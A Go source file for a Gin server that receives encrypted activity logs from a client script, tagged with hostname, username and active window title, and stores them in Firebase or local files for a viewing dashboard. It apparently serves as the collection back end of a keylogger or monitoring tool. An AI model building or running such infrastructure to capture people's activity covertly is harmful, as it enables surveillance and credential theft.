package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"syscall"

	"github.com/joho/godotenv"

	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"
)

const LOGS_DIR = "./logs"
const SERVER_PORT = ":8080"
const KEYS_DIR = "./keys"
const PRIVATE_KEY_FILE = "server_private.pem"
const PUBLIC_KEY_FILE = "server_public.pem"
const MAX_LOG_CHARACTERS = 500

type SystemInfo struct {
	SystemID     string `json:"system_id" firestore:"SystemID"`
	Hostname     string `json:"hostname" firestore:"hostname"`
	OS           string `json:"os" firestore:"os"`
	OSRelease    string `json:"os_release" firestore:"osRelease"`
	Username     string `json:"username" firestore:"username"`
	ActiveWindow string `json:"active_window" firestore:"activeWindow"`
}

type LogPayload struct {
	SystemInfo          SystemInfo `json:"system_info"`
	LogStartTimeUTC     string     `json:"log_start_time_utc"`
	LogDurationSeconds  float64    `json:"log_duration_seconds"`
	EncryptedAESKey     string     `json:"encrypted_aes_key"`
	EncryptedLogContent string     `json:"encrypted_log_content"`
}

type LogFile struct {
	SystemID string
	Filename string
	Content  string
}

type LogPageData struct {
	LogFiles []LogFile
}

var logSaver LogSaver

func main() {

	enableLocalLogs := flag.Bool("local-logs", false, "Enable saving logs ONLY to local files (disables Firebase).")
	flag.Parse()

	err := godotenv.Load()
	if err != nil {
		log.Println("WARNING: No .env file found or could not load .env file:", err)
	}

	if *enableLocalLogs {
		// Use FileSaver if -local-logs flag is set
		logSaver = &FileSaver{LogDirectory: LOGS_DIR}
		log.Printf("Log saving: Local files ONLY. Logs will be saved to: %s", LOGS_DIR)
		if err := os.MkdirAll(LOGS_DIR, 0755); err != nil {
			log.Fatalf("ERROR: Failed to create base logs directory '%s': %v", LOGS_DIR, err)
		}
	} else {
		// Default to FirebaseSaver if -local-logs flag is NOT set
		serviceAccountKeyPath := os.Getenv("FIREBASE_SERVICE_ACCOUNT_KEY_PATH")
		if serviceAccountKeyPath == "" {
			log.Fatalf("ERROR: Firebase service account key path not set in environment variable FIREBASE_SERVICE_ACCOUNT_KEY_PATH")
		}

		if _, err := os.Stat(serviceAccountKeyPath); os.IsNotExist(err) {
			log.Fatalf("ERROR: Firebase service account key file not found at: %s", serviceAccountKeyPath)
		}

		if err := InitializeFirebase(serviceAccountKeyPath); err != nil {
			log.Fatalf("ERROR: Failed to initialize Firebase: %v", err)
		}
		logSaver = &FirebaseSaver{}
		log.Println("Log saving: Firebase ONLY (default).")

		// Ensure Firebase client is closed on program exit ONLY if Firebase was initialized
		c := make(chan os.Signal, 1)
		signal.Notify(c, syscall.SIGINT, syscall.SIGTERM)
		go func() {
			<-c
			log.Println("Received interrupt signal, shutting down gracefully...")
			CloseFirebase()
			os.Exit(0)
		}()
	}

	// set up RSA keys
	if err := ensureKeys(); err != nil {
		log.Fatalf("ERROR: Failed to ensure RSA keys: %v", err)
	}

	router := gin.Default()

	router.Use(cors.New(cors.Config{
		AllowOrigins:     []string{"http://localhost:3000", "https://your-vercel-domain.vercel.app"},
		AllowMethods:     []string{"GET", "POST", "PUT", "DELETE", "OPTIONS"},
		AllowHeaders:     []string{"Origin", "Content-Type", "Accept", "Authorization"},
		ExposeHeaders:    []string{"Content-Length"},
		AllowCredentials: true,
	}))

	apiGroup := router.Group("/api")
	{
		// script endpoints
		apiGroup.GET("/handshake", handshakeHandler)
		apiGroup.POST("/log", logHandler)

		// site endpoints
		apiGroup.GET("/getSystems", getSystemsHandler)
		apiGroup.GET("/getLogs/:systemId/logs", getSystemLogsHandler)
	}

	// wont be in api group because it's for static files
	// also need router.GET(downloads)

	fmt.Printf("Go server listening on http://localhost%s\n", SERVER_PORT)
	log.Printf("Keys will be stored in: %s", KEYS_DIR)
	log.Printf("Logs will be stored in: %s", LOGS_DIR)

	if err := router.Run(SERVER_PORT); err != nil {
		log.Fatalf("Server failed to start: %v", err)
	}
}
